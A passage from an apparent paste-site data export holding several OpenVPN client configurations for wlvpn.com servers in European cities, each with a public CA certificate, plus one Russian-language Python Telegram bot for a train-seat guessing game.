KoZIhvcNAQkBFgNWUE4wIBcNMjIwNTA5MjA0NTA2WhgPMjA4MjA0MjQyMDQ1MDZa
MHUxCzAJBgNVBAYTAlVTMQwwCgYDVQQIEwNWUE4xDDAKBgNVBAcTA1ZQTjEMMAoG
A1UEChMDVlBOMQwwCgYDVQQLEwNWUE4xDDAKBgNVBAMTA1ZQTjEMMAoGA1UEKRMD
VlBOMRIwEAYJKoZIhvcNAQkBFgNWUE4wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw
ggEKAoIBAQDJSvYEDPaAcZpeuLqtYykqpy9VNfcg5IsR8FZ/V9vbMLDHT4YUwbbn
xiQ4KJCGj9g5fnxsmmywYjjY7NmK1KKxNWlc0gF6XMZQ90qDHSpREaANb7t47JIl
gKfURSdwSUkIe3WyjRJt91CnEDzxVkwf18U4q0tjmoceLR2teb/BnL7NbtN9Xktx
7Tjq+/Yz0jn8qjjNnlWHqNOjZWsJBHDyChcHk0B1TkPvqVWFYrhnO3jCgjydFbkS
/cBYTDmhfzmPkHRNj2cSLmPS81gG4zF/8aIs7wzwsIc9fQdgGIsONl6wkK+4be9/
CcBjkIlCo2O5+macXeK+xoXR0Z6jniRZAgMBAAGjgdowgdcwDAYDVR0TBAUwAwEB
/zAdBgNVHQ4EFgQUF58B5L6R0n/5TGnCqCrIQHBjNqkwgacGA1UdIwSBnzCBnIAU
F58B5L6R0n/5TGnCqCrIQHBjNqmheaR3MHUxCzAJBgNVBAYTAlVTMQwwCgYDVQQI
EwNWUE4xDDAKBgNVBAcTA1ZQTjEMMAoGA1UEChMDVlBOMQwwCgYDVQQLEwNWUE4x
DDAKBgNVBAMTA1ZQTjEMMAoGA1UEKRMDVlBOMRIwEAYJKoZIhvcNAQkBFgNWUE6C
CQCkqr5NgknSRjANBgkqhkiG9w0BAQ0FAAOCAQEAMjkx4HQoLkLVMix6j6HVf8Lr
lKnbDlMx3gYfkD8J5LhTrf8JezB07rSialwiF7lvs3+urvQQdUs5tZCARRDpQANR
b8XzxbDu3oO4eOOxiDPnHutZv04/rN3Y/s3kSrJEwXxnWDLSzn9IsJtFtV+oHwan
ijRI4jaTBAzaqpFzq1Ffm1O1PrFfhwjb4aEyahMXCU8xRavBGKu7EeXZ78lXJVqg
0q3hbTISxRXSa63JgwxZnXcHIyeO4V/bZIcJvIei17xlc7dLDHPdnyQtrD07+AEH
qioNZsFRPJqf8KwmVCEIJq38cM7nSRXrrZ36w9P4sMBRHABQBre2DIqdo9hoeA==
-----END CERTIFICATE-----
</ca>
tls-client
remote-cert-tls server
auth-user-pass
compress lzo
verb 3
auth SHA256
cipher AES-256-CBC
"
3zqejTXW,LISBOA,Netsemfim,Bash,Thursday 11th of April 2024 08:24:03 AM CDT,"client
dev tun
proto udp
remote lis-c10.vpn.wlvpn.com 1194
remote lis-c13.vpn.wlvpn.com 1194
remote lis-c14.vpn.wlvpn.com 1194
remote lis-c11.vpn.wlvpn.com 1194
remote lis-c12.vpn.wlvpn.com 1194
remote lis-c01.vpn.wlvpn.com 1194
remote lis-c02.vpn.wlvpn.com 1194
remote lis-c03.vpn.wlvpn.com 1194
remote lis-c04.vpn.wlvpn.com 1194
remote lis-c05.vpn.wlvpn.com 1194
remote-random
resolv-retry infinite
nobind
persist-key
persist-tun
persist-remote-ip
<ca>
-----BEGIN CERTIFICATE-----
MIIESjCCAzKgAwIBAgIJAKSqvk2CSdJGMA0GCSqGSIb3DQEBDQUAMHUxCzAJBgNV
BAYTAlVTMQwwCgYDVQQIEwNWUE4xDDAKBgNVBAcTA1ZQTjEMMAoGA1UEChMDVlBO
MQwwCgYDVQQLEwNWUE4xDDAKBgNVBAMTA1ZQTjEMMAoGA1UEKRMDVlBOMRIwEAYJ
KoZIhvcNAQkBFgNWUE4wIBcNMjIwNTA5MjA0NTA2WhgPMjA4MjA0MjQyMDQ1MDZa
MHUxCzAJBgNVBAYTAlVTMQwwCgYDVQQIEwNWUE4xDDAKBgNVBAcTA1ZQTjEMMAoG
A1UEChMDVlBOMQwwCgYDVQQLEwNWUE4xDDAKBgNVBAMTA1ZQTjEMMAoGA1UEKRMD
VlBOMRIwEAYJKoZIhvcNAQkBFgNWUE4wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw
ggEKAoIBAQDJSvYEDPaAcZpeuLqtYykqpy9VNfcg5IsR8FZ/V9vbMLDHT4YUwbbn
xiQ4KJCGj9g5fnxsmmywYjjY7NmK1KKxNWlc0gF6XMZQ90qDHSpREaANb7t47JIl
gKfURSdwSUkIe3WyjRJt91CnEDzxVkwf18U4q0tjmoceLR2teb/BnL7NbtN9Xktx
7Tjq+/Yz0jn8qjjNnlWHqNOjZWsJBHDyChcHk0B1TkPvqVWFYrhnO3jCgjydFbkS
/cBYTDmhfzmPkHRNj2cSLmPS81gG4zF/8aIs7wzwsIc9fQdgGIsONl6wkK+4be9/
CcBjkIlCo2O5+macXeK+xoXR0Z6jniRZAgMBAAGjgdowgdcwDAYDVR0TBAUwAwEB
/zAdBgNVHQ4EFgQUF58B5L6R0n/5TGnCqCrIQHBjNqkwgacGA1UdIwSBnzCBnIAU
F58B5L6R0n/5TGnCqCrIQHBjNqmheaR3MHUxCzAJBgNVBAYTAlVTMQwwCgYDVQQI
EwNWUE4xDDAKBgNVBAcTA1ZQTjEMMAoGA1UEChMDVlBOMQwwCgYDVQQLEwNWUE4x
DDAKBgNVBAMTA1ZQTjEMMAoGA1UEKRMDVlBOMRIwEAYJKoZIhvcNAQkBFgNWUE6C
CQCkqr5NgknSRjANBgkqhkiG9w0BAQ0FAAOCAQEAMjkx4HQoLkLVMix6j6HVf8Lr
lKnbDlMx3gYfkD8J5LhTrf8JezB07rSialwiF7lvs3+urvQQdUs5tZCARRDpQANR
b8XzxbDu3oO4eOOxiDPnHutZv04/rN3Y/s3kSrJEwXxnWDLSzn9IsJtFtV+oHwan
ijRI4jaTBAzaqpFzq1Ffm1O1PrFfhwjb4aEyahMXCU8xRavBGKu7EeXZ78lXJVqg
0q3hbTISxRXSa63JgwxZnXcHIyeO4V/bZIcJvIei17xlc7dLDHPdnyQtrD07+AEH
qioNZsFRPJqf8KwmVCEIJq38cM7nSRXrrZ36w9P4sMBRHABQBre2DIqdo9hoeA==
-----END CERTIFICATE-----
</ca>
tls-client
remote-cert-tls server
auth-user-pass
compress lzo
verb 3
auth SHA256
cipher AES-256-CBC
"
4FNJsNFM,Italia,Netsemfim,Bash,Thursday 11th of April 2024 08:22:48 AM CDT,"client
dev tun
proto udp
remote lin-a13.vpn.wlvpn.com 1194
remote lin-a14.vpn.wlvpn.com 1194
remote lin-a16.vpn.wlvpn.com 1194
remote lin-a17.vpn.wlvpn.com 1194
remote lin-a18.vpn.wlvpn.com 1194
remote lin-a19.vpn.wlvpn.com 1194
remote lin-a15.vpn.wlvpn.com 1194
remote lin-a20.vpn.wlvpn.com 1194
remote lin-a21.vpn.wlvpn.com 1194
remote lin-a22.vpn.wlvpn.com 1194
remote lin-a26.vpn.wlvpn.com 1194
remote lin-a27.vpn.wlvpn.com 1194
remote lin-a28.vpn.wlvpn.com 1194
remote lin-a29.vpn.wlvpn.com 1194
remote lin-a30.vpn.wlvpn.com 1194
remote lin-a31.vpn.wlvpn.com 1194
remote lin-a32.vpn.wlvpn.com 1194
remote lin-a34.vpn.wlvpn.com 1194
remote lin-a35.vpn.wlvpn.com 1194
remote lin-a36.vpn.wlvpn.com 1194
remote lin-a37.vpn.wlvpn.com 1194
remote lin-a38.vpn.wlvpn.com 1194
remote lin-a25.vpn.wlvpn.com 1194
remote lin-a24.vpn.wlvpn.com 1194
remote lin-a23.vpn.wlvpn.com 1194
remote-random
resolv-retry infinite
nobind
persist-key
persist-tun
persist-remote-ip
<ca>
-----BEGIN CERTIFICATE-----
MIIESjCCAzKgAwIBAgIJAKSqvk2CSdJGMA0GCSqGSIb3DQEBDQUAMHUxCzAJBgNV
BAYTAlVTMQwwCgYDVQQIEwNWUE4xDDAKBgNVBAcTA1ZQTjEMMAoGA1UEChMDVlBO
MQwwCgYDVQQLEwNWUE4xDDAKBgNVBAMTA1ZQTjEMMAoGA1UEKRMDVlBOMRIwEAYJ
KoZIhvcNAQkBFgNWUE4wIBcNMjIwNTA5MjA0NTA2WhgPMjA4MjA0MjQyMDQ1MDZa
MHUxCzAJBgNVBAYTAlVTMQwwCgYDVQQIEwNWUE4xDDAKBgNVBAcTA1ZQTjEMMAoG
A1UEChMDVlBOMQwwCgYDVQQLEwNWUE4xDDAKBgNVBAMTA1ZQTjEMMAoGA1UEKRMD
VlBOMRIwEAYJKoZIhvcNAQkBFgNWUE4wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw
ggEKAoIBAQDJSvYEDPaAcZpeuLqtYykqpy9VNfcg5IsR8FZ/V9vbMLDHT4YUwbbn
xiQ4KJCGj9g5fnxsmmywYjjY7NmK1KKxNWlc0gF6XMZQ90qDHSpREaANb7t47JIl
gKfURSdwSUkIe3WyjRJt91CnEDzxVkwf18U4q0tjmoceLR2teb/BnL7NbtN9Xktx
7Tjq+/Yz0jn8qjjNnlWHqNOjZWsJBHDyChcHk0B1TkPvqVWFYrhnO3jCgjydFbkS
/cBYTDmhfzmPkHRNj2cSLmPS81gG4zF/8aIs7wzwsIc9fQdgGIsONl6wkK+4be9/
CcBjkIlCo2O5+macXeK+xoXR0Z6jniRZAgMBAAGjgdowgdcwDAYDVR0TBAUwAwEB
/zAdBgNVHQ4EFgQUF58B5L6R0n/5TGnCqCrIQHBjNqkwgacGA1UdIwSBnzCBnIAU
F58B5L6R0n/5TGnCqCrIQHBjNqmheaR3MHUxCzAJBgNVBAYTAlVTMQwwCgYDVQQI
EwNWUE4xDDAKBgNVBAcTA1ZQTjEMMAoGA1UEChMDVlBOMQwwCgYDVQQLEwNWUE4x
DDAKBgNVBAMTA1ZQTjEMMAoGA1UEKRMDVlBOMRIwEAYJKoZIhvcNAQkBFgNWUE6C
CQCkqr5NgknSRjANBgkqhkiG9w0BAQ0FAAOCAQEAMjkx4HQoLkLVMix6j6HVf8Lr
lKnbDlMx3gYfkD8J5LhTrf8JezB07rSialwiF7lvs3+urvQQdUs5tZCARRDpQANR
b8XzxbDu3oO4eOOxiDPnHutZv04/rN3Y/s3kSrJEwXxnWDLSzn9IsJtFtV+oHwan
ijRI4jaTBAzaqpFzq1Ffm1O1PrFfhwjb4aEyahMXCU8xRavBGKu7EeXZ78lXJVqg
0q3hbTISxRXSa63JgwxZnXcHIyeO4V/bZIcJvIei17xlc7dLDHPdnyQtrD07+AEH
qioNZsFRPJqf8KwmVCEIJq38cM7nSRXrrZ36w9P4sMBRHABQBre2DIqdo9hoeA==
-----END CERTIFICATE-----
</ca>
tls-client
remote-cert-tls server
auth-user-pass
compress lzo
verb 3
auth SHA256
cipher AES-256-CBC
"
YgNvSZNu,Paris,Netsemfim,Bash,Thursday 11th of April 2024 08:21:27 AM CDT,"client
dev tun
proto udp
remote par-a15.vpn.wlvpn.com 1194
remote par-a16.vpn.wlvpn.com 1194
remote par-a17.vpn.wlvpn.com 1194
remote par-a18.vpn.wlvpn.com 1194
remote par-a19.vpn.wlvpn.com 1194
remote par-a20.vpn.wlvpn.com 1194
remote par-a21.vpn.wlvpn.com 1194
remote par-a22.vpn.wlvpn.com 1194
remote par-a23.vpn.wlvpn.com 1194
remote par-a24.vpn.wlvpn.com 1194
remote par-a26.vpn.wlvpn.com 1194
remote par-a25.vpn.wlvpn.com 1194
remote par-a13.vpn.wlvpn.com 1194
remote par-a14.vpn.wlvpn.com 1194
remote par-a02.vpn.wlvpn.com 1194
remote par-a01.vpn.wlvpn.com 1194
remote par-a03.vpn.wlvpn.com 1194
remote par-a05.vpn.wlvpn.com 1194
remote par-a04.vpn.wlvpn.com 1194
remote par-a09.vpn.wlvpn.com 1194
remote par-a11.vpn.wlvpn.com 1194
remote par-a06.vpn.wlvpn.com 1194
remote par-a08.vpn.wlvpn.com 1194
remote par-a12.vpn.wlvpn.com 1194
remote par-a27.vpn.wlvpn.com 1194
remote par-a28.vpn.wlvpn.com 1194
remote par-a29.vpn.wlvpn.com 1194
remote par-a30.vpn.wlvpn.com 1194
remote par-a31.vpn.wlvpn.com 1194
remote par-a32.vpn.wlvpn.com 1194
remote par-a34.vpn.wlvpn.com 1194
remote par-a35.vpn.wlvpn.com 1194
remote par-a36.vpn.wlvpn.com 1194
remote par-a37.vpn.wlvpn.com 1194
remote par-a38.vpn.wlvpn.com 1194
remote par-a33.vpn.wlvpn.com 1194
remote par-a07.vpn.wlvpn.com 1194
remote par-a10.vpn.wlvpn.com 1194
remote-random
resolv-retry infinite
nobind
persist-key
persist-tun
persist-remote-ip
<ca>
-----BEGIN CERTIFICATE-----
MIIESjCCAzKgAwIBAgIJAKSqvk2CSdJGMA0GCSqGSIb3DQEBDQUAMHUxCzAJBgNV
BAYTAlVTMQwwCgYDVQQIEwNWUE4xDDAKBgNVBAcTA1ZQTjEMMAoGA1UEChMDVlBO
MQwwCgYDVQQLEwNWUE4xDDAKBgNVBAMTA1ZQTjEMMAoGA1UEKRMDVlBOMRIwEAYJ
KoZIhvcNAQkBFgNWUE4wIBcNMjIwNTA5MjA0NTA2WhgPMjA4MjA0MjQyMDQ1MDZa
MHUxCzAJBgNVBAYTAlVTMQwwCgYDVQQIEwNWUE4xDDAKBgNVBAcTA1ZQTjEMMAoG
A1UEChMDVlBOMQwwCgYDVQQLEwNWUE4xDDAKBgNVBAMTA1ZQTjEMMAoGA1UEKRMD
VlBOMRIwEAYJKoZIhvcNAQkBFgNWUE4wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw
ggEKAoIBAQDJSvYEDPaAcZpeuLqtYykqpy9VNfcg5IsR8FZ/V9vbMLDHT4YUwbbn
xiQ4KJCGj9g5fnxsmmywYjjY7NmK1KKxNWlc0gF6XMZQ90qDHSpREaANb7t47JIl
gKfURSdwSUkIe3WyjRJt91CnEDzxVkwf18U4q0tjmoceLR2teb/BnL7NbtN9Xktx
7Tjq+/Yz0jn8qjjNnlWHqNOjZWsJBHDyChcHk0B1TkPvqVWFYrhnO3jCgjydFbkS
/cBYTDmhfzmPkHRNj2cSLmPS81gG4zF/8aIs7wzwsIc9fQdgGIsONl6wkK+4be9/
CcBjkIlCo2O5+macXeK+xoXR0Z6jniRZAgMBAAGjgdowgdcwDAYDVR0TBAUwAwEB
/zAdBgNVHQ4EFgQUF58B5L6R0n/5TGnCqCrIQHBjNqkwgacGA1UdIwSBnzCBnIAU
F58B5L6R0n/5TGnCqCrIQHBjNqmheaR3MHUxCzAJBgNVBAYTAlVTMQwwCgYDVQQI
EwNWUE4xDDAKBgNVBAcTA1ZQTjEMMAoGA1UEChMDVlBOMQwwCgYDVQQLEwNWUE4x
DDAKBgNVBAMTA1ZQTjEMMAoGA1UEKRMDVlBOMRIwEAYJKoZIhvcNAQkBFgNWUE6C
CQCkqr5NgknSRjANBgkqhkiG9w0BAQ0FAAOCAQEAMjkx4HQoLkLVMix6j6HVf8Lr
lKnbDlMx3gYfkD8J5LhTrf8JezB07rSialwiF7lvs3+urvQQdUs5tZCARRDpQANR
b8XzxbDu3oO4eOOxiDPnHutZv04/rN3Y/s3kSrJEwXxnWDLSzn9IsJtFtV+oHwan
ijRI4jaTBAzaqpFzq1Ffm1O1PrFfhwjb4aEyahMXCU8xRavBGKu7EeXZ78lXJVqg
0q3hbTISxRXSa63JgwxZnXcHIyeO4V/bZIcJvIei17xlc7dLDHPdnyQtrD07+AEH
qioNZsFRPJqf8KwmVCEIJq38cM7nSRXrrZ36w9P4sMBRHABQBre2DIqdo9hoeA==
-----END CERTIFICATE-----
</ca>
tls-client
remote-cert-tls server
auth-user-pass
compress lzo
verb 3
auth SHA256
cipher AES-256-CBC
"
vCj4hfTv,Untitled,Netsemfim,Bash,Thursday 11th of April 2024 08:17:28 AM CDT,"client
dev tun
proto udp
remote bod-c01.vpn.wlvpn.com 1194
remote bod-c02.vpn.wlvpn.com 1194
remote bod-c03.vpn.wlvpn.com 1194
remote bod-c04.vpn.wlvpn.com 1194
remote bod-c05.vpn.wlvpn.com 1194
remote bod-c06.vpn.wlvpn.com 1194
remote bod-c07.vpn.wlvpn.com 1194
remote bod-c08.vpn.wlvpn.com 1194
remote bod-c09.vpn.wlvpn.com 1194
remote-random
resolv-retry infinite
nobind
persist-key
persist-tun
persist-remote-ip
<ca>
-----BEGIN CERTIFICATE-----
MIIESjCCAzKgAwIBAgIJAKSqvk2CSdJGMA0GCSqGSIb3DQEBDQUAMHUxCzAJBgNV
BAYTAlVTMQwwCgYDVQQIEwNWUE4xDDAKBgNVBAcTA1ZQTjEMMAoGA1UEChMDVlBO
MQwwCgYDVQQLEwNWUE4xDDAKBgNVBAMTA1ZQTjEMMAoGA1UEKRMDVlBOMRIwEAYJ
KoZIhvcNAQkBFgNWUE4wIBcNMjIwNTA5MjA0NTA2WhgPMjA4MjA0MjQyMDQ1MDZa
MHUxCzAJBgNVBAYTAlVTMQwwCgYDVQQIEwNWUE4xDDAKBgNVBAcTA1ZQTjEMMAoG
A1UEChMDVlBOMQwwCgYDVQQLEwNWUE4xDDAKBgNVBAMTA1ZQTjEMMAoGA1UEKRMD
VlBOMRIwEAYJKoZIhvcNAQkBFgNWUE4wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw
ggEKAoIBAQDJSvYEDPaAcZpeuLqtYykqpy9VNfcg5IsR8FZ/V9vbMLDHT4YUwbbn
xiQ4KJCGj9g5fnxsmmywYjjY7NmK1KKxNWlc0gF6XMZQ90qDHSpREaANb7t47JIl
gKfURSdwSUkIe3WyjRJt91CnEDzxVkwf18U4q0tjmoceLR2teb/BnL7NbtN9Xktx
7Tjq+/Yz0jn8qjjNnlWHqNOjZWsJBHDyChcHk0B1TkPvqVWFYrhnO3jCgjydFbkS
/cBYTDmhfzmPkHRNj2cSLmPS81gG4zF/8aIs7wzwsIc9fQdgGIsONl6wkK+4be9/
CcBjkIlCo2O5+macXeK+xoXR0Z6jniRZAgMBAAGjgdowgdcwDAYDVR0TBAUwAwEB
/zAdBgNVHQ4EFgQUF58B5L6R0n/5TGnCqCrIQHBjNqkwgacGA1UdIwSBnzCBnIAU
F58B5L6R0n/5TGnCqCrIQHBjNqmheaR3MHUxCzAJBgNVBAYTAlVTMQwwCgYDVQQI
EwNWUE4xDDAKBgNVBAcTA1ZQTjEMMAoGA1UEChMDVlBOMQwwCgYDVQQLEwNWUE4x
DDAKBgNVBAMTA1ZQTjEMMAoGA1UEKRMDVlBOMRIwEAYJKoZIhvcNAQkBFgNWUE6C
CQCkqr5NgknSRjANBgkqhkiG9w0BAQ0FAAOCAQEAMjkx4HQoLkLVMix6j6HVf8Lr
lKnbDlMx3gYfkD8J5LhTrf8JezB07rSialwiF7lvs3+urvQQdUs5tZCARRDpQANR
b8XzxbDu3oO4eOOxiDPnHutZv04/rN3Y/s3kSrJEwXxnWDLSzn9IsJtFtV+oHwan
ijRI4jaTBAzaqpFzq1Ffm1O1PrFfhwjb4aEyahMXCU8xRavBGKu7EeXZ78lXJVqg
0q3hbTISxRXSa63JgwxZnXcHIyeO4V/bZIcJvIei17xlc7dLDHPdnyQtrD07+AEH
qioNZsFRPJqf8KwmVCEIJq38cM7nSRXrrZ36w9P4sMBRHABQBre2DIqdo9hoeA==
-----END CERTIFICATE-----
</ca>
tls-client
remote-cert-tls server
auth-user-pass
compress lzo
verb 3
auth SHA256
cipher AES-256-CBC
"
Bp04wAwi,Поезда Py v2,SillyWolfy,Python,Thursday 11th of April 2024 08:15:51 AM CDT,"# Обновленная версия функции output с интеграцией в команду /start_game
from telebot import TeleBot, types
import sql_trains
import sqlite3
import random

def games_handler(id_game, messgae, team_id, user_id , mode):
    match(id_game):# Какая игра такое и действие
        case(1):
            if mode == ""final"":
                # Генерация нового загаданного числа для каждого раунда
                new_original_place = random.randint(1, 54)
                sql_trains.create_table_if_not_exist()
                if not sql_trains.check_user_exists(user_id):
                    sql_trains.add_player(user_id)
                    sql_trains.update_orig_num(user_id,new_original_place)
                    return (""Вы зарегистрированы в игре 'Поезда' 😃\n""
                            ""Это режим песочницы\n""
                            ""Здесь вы сразу проигрываете раунд, если текущее место выходит за пределы вагона или если вы неправильно угадали число\n""
                            ""Игра загадывает вам место в вагоне поезда и даёт 6 попыток, в каждую из который вы можете:\n""
                            ""1) Угадать загаданное место (можно сделать только 1 раз за игру) \n""
                            ""2) Ввести число, которое будет складываться с текущим местом.\n""
                            ""Если вы не выйдете за пределы вагона, то вам выдадут подсказку от том, где сейчас находится текущее место\n""
                            ""При этом текущее место изменяется на сумму предыдущего места и вашего числа\n""
                            ""Ваша задача в как можно в большем колличестве раундов угадать загаданное число\n""
                            ""Давайте скажем вам формат сообщений, который поддерживает игра:\n""
                            ""/ask (number)\n""
                            ""/answer (number)\n""
                            ""Командой ask вы подаёте число игре, на которое она вам возвращает подсказку""
                            ""Командой answer вы пытаетесь угадать загаданное число\n""
                            ""Ну чтож, давайте попробуем! 🎲\n"")

                user_data = sql_trains.get_user_data(user_id)
                id, round_, try_, original_place, current_place, score = user_data
                input_command = messgae.split()
                if ((input_command[0] != '/ask' and input_command[0] != ""/answer"") or len(input_command) != 2 or
                                                                                                        not str(input_command[1].isnumeric())):
                    return (f""Некоректный ввод\n"")

                user_command = input_command[0]
                number = int(input_command[1])



                if round_ >= 5:
                    return (f""Игра окончена. Было сыграно 5 раундов\n""
                            f""Вы набрали: {score} очков"")                           



                # Проверка на 100% выход за пределы вагона
                if number < -54 or number > 54 or try_ <= 0:
                    sql_trains.update_round(user_id, new_original_place)
                    return (f""WA. Число всегда за пределами вагона\n"")

                # Отнимаем одну попытку в бд
                sql_trains.minus_try(user_id)

                # Если команда /answer
                if user_command == '/asnwer':
                    if number == original_place:
                        sql_trains.update_round(user_id, new_original_place)
                        sql_trains.add_score(user_id)
                        return ""OK""
                    else:
                        sql_trains.update_round(user_id, new_original_place)
                        return (f""WA. Вы предположили загаданное место неправильно\n"")

                # Если команда /ask
                elif user_command == '/ask':
                    updated_current_place = current_place + number
                    if 1 <= updated_current_place <= 54:
                        char_string = ""low"" if updated_current_place % 2 != 0 else ""high""
                        char_string += "" side"" if updated_current_place >= 37 else "" main""
                        sql_trains.update_cur_num(updated_current_place, user_id)
                        sql_trains.minus_try(user_id)
                        return (
                            f""Ваше текущее место принадлежит секции: {char_string}\n"")
                    else:
                        sql_trains.update_round(user_id, new_original_place)
                        return (f""WA. Текущее место вышло за пределы вагона\n"")
                else:
                    return ""Неверная команда.""
            else:
                # Генерация нового загаданного числа для каждого раунда
                new_original_place = random.randint(1, 54)
                sql_trains.create_table_if_not_exist()
                if not sql_trains.check_user_exists(user_id):
                    sql_trains.add_player(user_id)
                    sql_trains.update_orig_num(user_id,new_original_place)
                    return (""Вы зарегистрированы в игре 'Поезда' 😃\n""
                            ""Это режим песочницы\n""
                            ""Здесь вы сразу проигрываете раунд, если текущее место выходит за пределы вагона или если вы неправильно угадали число\n""
                            ""Но здесь вам будет показываться ваше текущее место и загаданное место\n""
                            ""Игра загадывает вам место в вагоне поезда и даёт 6 попыток, в каждую из который вы можете:\n""
                            ""1) Угадать загаданное место (можно сделать только 1 раз за игру) \n""
                            ""2) Ввести число, которое будет складываться с текущим местом.\n""
                            ""Если вы не выйдете за пределы вагона, то вам выдадут подсказку от том, где сейчас находится текущее место\n""
                            ""При этом текущее место изменяется на сумму предыдущего места и вашего числа\n""
                            ""Ваша задача в как можно в большем кол-ве раундов угадать загаданное число\n""
                            ""Давайте скажем вам формат сообщений, который поддерживает игра:\n""
                            ""/ask (number)\n""
                            ""/answer (number)\n""
                            ""Командой ask вы подаёте число игре, на которое она вам возвращает подсказку""
                            ""Командой answer вы пытаетесь угадать загаданное число\n""
                            ""Ну что ж, давайте попробуем! 🎲\n"")

                user_data = sql_trains.get_user_data(user_id)
                id, round_, try_, original_place, current_place, score = user_data
                input_command = messgae.split()
                if ((input_command[0] != '/ask' and input_command[0] != ""/answer"") or len(input_command) != 2 or
                                                                                                        not str(input_command[1].isnumeric())):
                    return (f""Некоректный ввод\n""
                            f""Вы играете раунд№{round_}\n""
                            f""У вас осталось {try_} попыток\n"")

                user_command = input_command[0]
                number = int(input_command[1])



                if round_ >= 5:
                    return (f""Игра окончена. Было сыграно 5 раундов\n""
                            f""Вы набрали: {score} очков"")                           



                # Проверка на 100% выход за пределы вагона
                if number < -54 or number > 54 or try_ <= 0:
                    sql_trains.update_round(user_id, new_original_place)
                    return (f""WA. Число всегда за пределами вагона\n""
                            f""Загаданное место: {original_place}\n""
                            f""Текущее место: {current_place}\n""
                            )

                # Отнимаем одну попытку в бд
                sql_trains.minus_try(user_id)

                # Если команда /answer
                if user_command == '/asnwer':
                    if number == original_place:
                        sql_trains.update_round(user_id, new_original_place)
                        sql_trains.add_score(user_id)
                        return ""OK""
                    else:
                        sql_trains.update_round(user_id, new_original_place)
                        return (f""WA. Вы предположили загаданное место неправильно\n""
                                f""Загаданное место: {original_place}\n""
                                f""Текущее место: {current_place}\n""
                                )

                # Если команда /ask
                elif user_command == '/ask':
                    updated_current_place = current_place + number
                    if 1 <= updated_current_place <= 54:
                        char_string = ""low"" if updated_current_place % 2 != 0 else ""high""
                        char_string += "" side"" if updated_current_place >= 37 else "" main""
                        sql_trains.update_cur_num(updated_current_place, user_id)
                        sql_trains.minus_try(user_id)
                        return (
                            f""Ваше текущее место принадлежит секции: {char_string}\n""
                            f""Загаданное место: {original_place}\n""
                            f""Текущее место: {updated_current_place}\n"")  # f""Подсказка: {char_string}. Текущее число: {updated_current_place}. {original_place}""
                    else:
                        sql_trains.update_round(user_id, new_original_place)
                        return (f""WA. Текущее место вышло за пределы вагона\n""
                                f""Загаданное место: {original_place}\n""
                                f""Текущее место: {updated_current_place}\n"")
                else:
                    return ""Неверная команда.""

        case(2):
            return(0)
"
FHmrTTZH,Untitled,Netsemfim,Bash,Thursday 11th of April 2024 08:15:47 AM CDT,"client
dev tun
proto udp
remote mad-a02.vpn.wlvpn.com 1194
remote mad-a01.vpn.wlvpn.com 1194
remote mad-a07.vpn.wlvpn.com 1194
remote mad-a08.vpn.wlvpn.com 1194
remote mad-a09.vpn.wlvpn.com 1194
remote mad-a10.vpn.wlvpn.com 1194
remote mad-a12.vpn.wlvpn.com 1194
remote mad-a13.vpn.wlvpn.com 1194
remote mad-a14.vpn.wlvpn.com 1194
remote mad-a15.vpn.wlvpn.com 1194
remote mad-a16.vpn.wlvpn.com 1194
remote mad-a03.vpn.wlvpn.com 1194
remote mad-a04.vpn.wlvpn.com 1194
remote mad-a17.vpn.wlvpn.com 1194
remote mad-a19.vpn.wlvpn.com 1194
remote mad-a20.vpn.wlvpn.com 1194
remote mad-a21.vpn.wlvpn.com 1194
remote mad-a22.vpn.wlvpn.com 1194
remote mad-a23.vpn.wlvpn.com 1194
remote mad-a24.vpn.wlvpn.com 1194
remote mad-a25.vpn.wlvpn.com 1194
remote mad-a26.vpn.wlvpn.com 1194
remote mad-a27.vpn.wlvpn.com 1194
remote mad-a28.vpn.wlvpn.com 1194
remote mad-a29.vpn.wlvpn.com 1194
remote mad-a30.vpn.wlvpn.com 1194
remote mad-a05.vpn.wlvpn.com 1194
remote mad-a06.vpn.wlvpn.com 1194
remote mad-a11.vpn.wlvpn.com 1194
remote mad-a18.vpn.wlvpn.com 1194
remote-random
resolv-retry infinite
nobind
persist-key
persist-tun
persist-remote-ip
<ca>
-----BEGIN CERTIFICATE-----
MIIESjCCAzKgAwIBAgIJAKSqvk2CSdJGMA0GCSqGSIb3DQEBDQUAMHUxCzAJBgNV
BAYTAlVTMQwwCgYDVQQIEwNWUE4xDDAKBgNVBAcTA1ZQTjEMMAoGA1UEChMDVlBO
MQwwCgYDVQQLEwNWUE4xDDAKBgNVBAMTA1ZQTjEMMAoGA1UEKRMDVlBOMRIwEAYJ
KoZIhvcNAQkBFgNWUE4wIBcNMjIwNTA5MjA0NTA2WhgPMjA4MjA0MjQyMDQ1MDZa
MHUxCzAJBgNVBAYTAlVTMQwwCgYDVQQIEwNWUE4xDDAKBgNVBAcTA1ZQTjEMMAoG
A1UEChMDVlBOMQwwCgYDVQQLEwNWUE4xDDAKBgNVBAMTA1ZQTjEMMAoGA1UEKRMD
VlBOMRIwEAYJKoZIhvcNAQkBFgNWUE4wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw
ggEKAoIBAQDJSvYEDPaAcZpeuLqtYykqpy9VNfcg5IsR8FZ/V9vbMLDHT4YUwbbn
xiQ4KJCGj9g5fnxsmmywYjjY7NmK1KKxNWlc0gF6XMZQ90qDHSpREaANb7t47JIl
gKfURSdwSUkIe3WyjRJt91CnEDzxVkwf18U4q0tjmoceLR2teb/BnL7NbtN9Xktx
7Tjq+/Yz0jn8qjjNnlWHqNOjZWsJBHDyChcHk0B1TkPvqVWFYrhnO3jCgjydFbkS
/cBYTDmhfzmPkHRNj2cSLmPS81gG4zF/8aIs7wzwsIc9fQdgGIsONl6wkK+4be9/
CcBjkIlCo2O5+macXeK+xoXR0Z6jniRZAgMBAAGjgdowgdcwDAYDVR0TBAUwAwEB
/zAdBgNVHQ4EFgQUF58B5L6R0n/5TGnCqCrIQHBjNqkwgacGA1UdIwSBnzCBnIAU
F58B5L6R0n/5TGnCqCrIQHBjNqmheaR3MHUxCzAJBgNVBAYTAlVTMQwwCgYDVQQI
EwNWUE4xDDAKBgNVBAcTA1ZQTjEMMAoGA1UEChMDVlBOMQwwCgYDVQQLEwNWUE4x
DDAKBgNVBAMTA1ZQTjEMMAoGA1UEKRMDVlBOMRIwEAYJKoZIhvcNAQkBFgNWUE6C
